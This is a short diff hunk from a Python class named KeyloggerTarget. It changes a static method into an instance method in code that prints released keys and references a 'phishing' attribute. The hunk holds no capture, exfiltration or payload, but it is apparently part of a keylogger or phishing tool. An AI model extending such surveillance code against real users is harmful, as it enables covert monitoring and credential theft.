@@ -334,9 +334,8 @@ class KeyloggerTarget:
 
     def on_release(self, key):
         print(f'Key released: {key}')
-
-    @staticmethod
-    def internet_connection():
+        
+    def internet_connection(self):
         # This function checks if a connection is stable
         if self.phishing is not None:
             while True:
